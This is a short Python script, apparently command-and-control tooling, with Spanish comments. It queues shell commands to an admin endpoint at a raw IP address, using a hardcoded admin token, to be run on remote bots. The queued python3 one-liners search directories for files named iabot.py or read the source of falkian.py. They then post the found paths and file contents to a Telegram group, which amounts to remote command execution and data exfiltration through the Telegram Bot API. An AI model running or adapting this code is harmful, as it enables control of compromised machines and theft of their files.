import requests
import json
import os
import sys

TOKEN = "TELEGRAM_TOKEN_C2"
GROUP_ID = "-1003808302723"

def send_to_group(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": GROUP_ID, "text": text}
    requests.post(url, json=payload, timeout=10)

def enqueue_command(bot, cmd):
    url = "http://93.93.116.244:4471/admin/execute"
    headers = {"X-Admin-Token": "antigravity_admin_master_2026", "Content-Type": "application/json"}
    payload = {"target": "bot", "bot": bot, "cmd": cmd}
    r = requests.post(url, headers=headers, json=payload, timeout=10)
    print(f"Enqueued for {bot}: {r.status_code}")

# Comandos para MiLeNiUm (Búsqueda exhaustiva)
cmd_milenium = """
python3 -c 'import os, requests; 
results = []
for root, dirs, files in os.walk("/home/irc"):
    if "iabot.py" in files:
        results.append(os.path.join(root, "iabot.py"))
for root, dirs, files in os.walk("/mnt/c/Users/WinterOS/Documents/ircbots/bots"):
    if "iabot.py" in files:
        results.append(os.path.join(root, "iabot.py"))
requests.post("https://api.telegram.org/botTELEGRAM_TOKEN_C2/sendMessage", json={"chat_id": "-1003808302723", "text": "🔎 FOUND iabot.py:\\n" + "\\n".join(results)})'
"""

# Comandos para iND0MiTa
cmd_indomita = """
python3 -c 'import os, requests; 
path=os.path.abspath("falkian.py"); 
content=open(path).read();
idx=content.find("def _notify_telegram");
requests.post("https://api.telegram.org/botTELEGRAM_TOKEN_C2/sendMessage", json={"chat_id": "-1003808302723", "text": "📍 PATH: " + path + "\\n\\nNOTIFY:\\n" + content[idx:idx+500]})'
"""

enqueue_command("MiLeNiUm", cmd_milenium.strip())
enqueue_command("iND0MiTa", cmd_indomita.strip())
